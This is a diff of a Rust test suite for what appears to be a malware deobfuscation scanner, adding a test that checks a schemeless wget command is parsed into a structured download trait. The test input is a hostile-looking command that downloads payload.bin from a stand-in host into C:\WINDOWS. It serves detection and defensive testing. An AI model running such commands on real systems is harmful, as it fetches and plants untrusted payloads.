@@ -14407,6 +14407,27 @@ C:\Users\Public\cu.tmp -K curl.cfg
     }
 
     #[test]
+    fn wget_schemeless_domain_path_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget wget-schemeless-deob.example/payload.bin -O C:\WINDOWS\payload.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://wget-schemeless-deob.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\WINDOWS\\payload.bin")
+            )
+        });
+        assert!(
+            has,
+            "no structured schemeless wget Download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn wget_short_o_glued_in_deob_text_emits_clean_destination() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
